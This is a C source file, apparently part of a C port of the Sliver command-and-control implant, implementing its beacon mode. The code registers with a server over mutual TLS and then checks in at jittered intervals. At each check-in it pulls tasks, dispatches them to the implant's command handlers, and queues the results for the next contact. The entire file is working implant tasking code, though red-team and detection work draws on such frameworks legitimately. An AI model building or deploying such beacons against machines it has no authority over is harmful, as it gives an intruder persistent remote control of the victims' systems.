/* src/modes/beacon.c - beacon scheduler (register + periodic check-in).
 *
 * Shares everything below the link with the session scheduler: the channel
 * (mTLS + MUX/1 + yamux + signed frames), the envelope codecs, the RPC dispatch
 * table and every handler. The only differences are lifecycle and timing:
 *
 *   register : connect -> BeaconRegister -> short grace -> close
 *   check-in : connect -> BeaconTasks(pending results) -> [recv tasks] -> close
 *              -> sleep(interval + jitter)
 *
 * Results produced by a check-in are queued and delivered by the next one, which
 * mirrors the Go implant (a result-only check-in does not wait for a reply).
 */
#include "sliver/implant.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "sliver/channel.h"
#include "sliver/config.h"
#include "sliver/log.h"
#include "sliver/platform.h"
#include "sliver/proto.h"
#include "sliver/rpc.h"

#define SLIVER_BEACON_MAX_PENDING 64
/* Give the server time to consume a frame before the session is torn down; the
 * Go beacon does Send then Sleep(1s) for the same reason. */
#define SLIVER_BEACON_GRACE_MS 1000u
#define SLIVER_BEACON_DEFAULT_INTERVAL_NS 60000000000LL

/* --- pending result queue ------------------------------------------------ */
static sliver_buf_t g_pending[SLIVER_BEACON_MAX_PENDING];
static size_t g_pending_count = 0;
static sliver_mutex_t *g_pending_lock = NULL;

static void pending_init(void) {
  if (g_pending_lock == NULL) {
    g_pending_lock = sliver_mutex_create();
  }
}

/* Takes ownership of env on success. */
static int pending_push(sliver_buf_t *env) {
  int rc = -1;
  if (g_pending_lock != NULL) {
    sliver_mutex_lock(g_pending_lock);
  }
  if (g_pending_count < SLIVER_BEACON_MAX_PENDING) {
    g_pending[g_pending_count++] = *env;
    rc = 0;
  }
  if (g_pending_lock != NULL) {
    sliver_mutex_unlock(g_pending_lock);
  }
  return rc;
}

static size_t pending_count(void) {
  size_t n;
  if (g_pending_lock != NULL) {
    sliver_mutex_lock(g_pending_lock);
  }
  n = g_pending_count;
  if (g_pending_lock != NULL) {
    sliver_mutex_unlock(g_pending_lock);
  }
  return n;
}

/* Drops the first n entries (they were just delivered). */
static void pending_drop(size_t n) {
  size_t i;
  if (g_pending_lock != NULL) {
    sliver_mutex_lock(g_pending_lock);
  }
  if (n > g_pending_count) {
    n = g_pending_count;
  }
  for (i = 0; i < n; ++i) {
    sliver_buf_free(&g_pending[i]);
  }
  if (n < g_pending_count) {
    memmove(&g_pending[0], &g_pending[n], (g_pending_count - n) * sizeof(g_pending[0]));
  }
  g_pending_count -= n;
  if (g_pending_lock != NULL) {
    sliver_mutex_unlock(g_pending_lock);
  }
}

/* rpc sender: background handlers (execute) only enqueue here. Never touches the
 * link, so a worker finishing after the connection closed is harmless. */
static int beacon_rpc_send(int64_t envelope_id, uint32_t type, const void *data, size_t len) {
  sliver_buf_t env;
  sliver_buf_init(&env);
  if (sliver_envelope_encode(&env, envelope_id, type, data, len) != 0) {
    sliver_buf_free(&env);
    return -1;
  }
  if (pending_push(&env) != 0) {
    sliver_buf_free(&env);
    return -1;
  }
  return 0;
}

/* --- helpers ------------------------------------------------------------- */
static uint64_t beacon_rand_u64(void) {
  static uint64_t seed = 0;
  if (seed == 0) {
    seed = sliver_now_ms() | 1u;
  }
  seed ^= seed << 13;
  seed ^= seed >> 7;
  seed ^= seed << 17;
  return seed;
}

/* Random RFC 4122 v4 UUID. The server parses BeaconRegister.ID and
 * Register.Uuid as UUIDs without a fallback (unlike the session handler), and
 * build_id is the implant name at build time, so a random id is required. */
static void uuid4_generate(char *out, size_t cap) {
  static const char hex[] = "0123456789abcdef";
  char buf[37];
  int i;

  if (out == NULL || cap < 37) {
    return;
  }
  for (i = 0; i < 36; ++i) {
    uint64_t r = beacon_rand_u64();
    buf[i] = (i == 8 || i == 13 || i == 18 || i == 23) ? '-' : hex[r & 0xf];
  }
  buf[14] = '4';                                /* version 4 */
  buf[19] = hex[8 + (beacon_rand_u64() & 0x3)]; /* variant 8..b */
  buf[36] = '\0';
  (void)snprintf(out, cap, "%s", buf);
}

static void beacon_dispatch_task(const sliver_envelope_t *task) {
  sliver_rpc_result_t result;
  memset(&result, 0, sizeof(result));
  sliver_rpc_dispatch(task, &result);
  if (result.handled && !result.no_response) {
    sliver_buf_t env;
    sliver_buf_init(&env);
    if (sliver_envelope_encode(&env, task->id, result.resp_type, result.message.data,
                               result.message.len) == 0) {
      if (pending_push(&env) != 0) {
        LOG_WARN("beacon: pending queue full, dropping a result");
        sliver_buf_free(&env);
      }
    } else {
      sliver_buf_free(&env);
    }
  } else if (!result.handled) {
    LOG_WARN("beacon: unsupported task type %u", task->type);
  }
  sliver_rpc_result_free(&result);
}

/* One check-in round trip. Returns 0 on success. */
static int beacon_checkin(const sliver_session_config_t *cfg, const char *id,
                          int64_t next_checkin) {
  sliver_channel_t *ch = NULL;
  char err[256];
  size_t to_send;
  int rc = 0;

  err[0] = '\0';
  if (sliver_channel_dial(cfg->host, cfg->port, cfg->ca_pem, cfg->cert_pem, cfg->key_pem,
                          cfg->age_private_key, cfg->server_minisign_pubkey, &ch, err,
                          sizeof(err)) != 0) {
    LOG_WARN("beacon: connect failed: %s", err);
    return -1;
  }

  to_send = pending_count();
  if (to_send > SLIVER_BEACON_MAX_PENDING) {
    to_send = SLIVER_BEACON_MAX_PENDING;
  }
  {
    sliver_buf_t tasks_env;
    sliver_buf_t env;
    sliver_buf_init(&tasks_env);
    sliver_buf_init(&env);
    if (sliver_beacon_tasks_encode(&tasks_env, id, next_checkin, g_pending, to_send) == 0 &&
        sliver_envelope_encode(&env, 0, SLIVER_MSG_BEACON_TASKS, tasks_env.data,
                               tasks_env.len) == 0) {
      if (ch->send(ch, env.data, env.len) == 0) {
        pending_drop(to_send);
        LOG_DEBUG("beacon: check-in sent (%u results)", (unsigned)to_send);
      }
    }
    sliver_buf_free(&tasks_env);
    sliver_buf_free(&env);
  }

  /* A result-only check-in does not wait for tasks (Go behaviour). */
  if (to_send == 0) {
    sliver_buf_t reply;
    sliver_envelope_t env_resp;
    sliver_buf_init(&reply);
    if (ch->recv(ch, &reply) == 0 && reply.len != 0 &&
        sliver_envelope_decode(reply.data, reply.len, &env_resp) == 0 &&
        env_resp.type == SLIVER_MSG_BEACON_TASKS) {
      char bid[64];
      int64_t next = 0;
      sliver_envelope_t tasks[SLIVER_BEACON_MAX_PENDING];
      size_t task_count = 0;
      if (sliver_beacon_tasks_decode(env_resp.data, env_resp.data_len, bid, sizeof(bid),
                                     &next, tasks,
                                     sizeof(tasks) / sizeof(tasks[0]), &task_count) == 0) {
        size_t i;
        LOG_DEBUG("beacon: %u task(s) received", (unsigned)task_count);
        for (i = 0; i < task_count; ++i) {
          beacon_dispatch_task(&tasks[i]);
        }
      }
    }
    sliver_buf_free(&reply);
  }

  rc = 0;
  sliver_sleep_ms(SLIVER_BEACON_GRACE_MS);
  sliver_channel_free(ch);
  return rc;
}

int sliver_beacon_run(const char *argv0) {
  sliver_session_config_t cfg;
  char host[256];
  char instance_id[37];
  long long interval_ns = sliver_config_beacon_interval_ns();
  long long jitter_ns = sliver_config_beacon_jitter_ns();
  int64_t next_checkin;
  const char *id;

  if (sliver_session_config_build(&cfg, host, sizeof(host), argv0) != 0) {
    return -1;
  }
  if (interval_ns <= 0) {
    interval_ns = SLIVER_BEACON_DEFAULT_INTERVAL_NS;
  }

  /* One id per beacon instance, used for BeaconRegister.ID and Register.Uuid. */
  uuid4_generate(instance_id, sizeof(instance_id));
  id = instance_id;
  (void)snprintf(cfg.reg.uuid, sizeof(cfg.reg.uuid), "%s", instance_id);
  (void)snprintf(cfg.reg.active_c2, sizeof(cfg.reg.active_c2), "mtls://%s:%u", cfg.host,
                 (unsigned)cfg.port);
  cfg.reg.reconnect_interval = interval_ns;
  next_checkin = interval_ns / 1000000000LL;

  pending_init();
  sliver_rpc_set_sender(beacon_rpc_send);

  /* Register once. */
  {
    sliver_channel_t *ch = NULL;
    char err[256];
    err[0] = '\0';
    if (sliver_channel_dial(cfg.host, cfg.port, cfg.ca_pem, cfg.cert_pem, cfg.key_pem,
                            cfg.age_private_key, cfg.server_minisign_pubkey, &ch, err,
                            sizeof(err)) == 0) {
      sliver_buf_t payload;
      sliver_buf_t env;
      sliver_buf_init(&payload);
      sliver_buf_init(&env);
      if (sliver_beacon_register_encode(&payload, id, interval_ns, jitter_ns, &cfg.reg,
                                        next_checkin) == 0 &&
          sliver_envelope_encode(&env, 0, SLIVER_MSG_BEACON_REGISTER, payload.data,
                                 payload.len) == 0) {
        (void)ch->send(ch, env.data, env.len);
      }
      sliver_buf_free(&payload);
      sliver_buf_free(&env);
      sliver_sleep_ms(SLIVER_BEACON_GRACE_MS);
      sliver_channel_free(ch);
      LOG_INFO("beacon: registered (%s)", id);
    } else {
      LOG_WARN("beacon: register failed: %s", err);
    }
  }

  /* Check-in loop. */
  for (;;) {
    uint64_t sleep_ms = (uint64_t)(interval_ns / 1000000LL);
    if (jitter_ns > 0) {
      sleep_ms += beacon_rand_u64() % (uint64_t)(jitter_ns / 1000000LL + 1);
    }
    if (sleep_ms == 0) {
      sleep_ms = 1000;
    }
    sliver_sleep_ms((uint32_t)sleep_ms);
    (void)beacon_checkin(&cfg, id, next_checkin);
  }
}
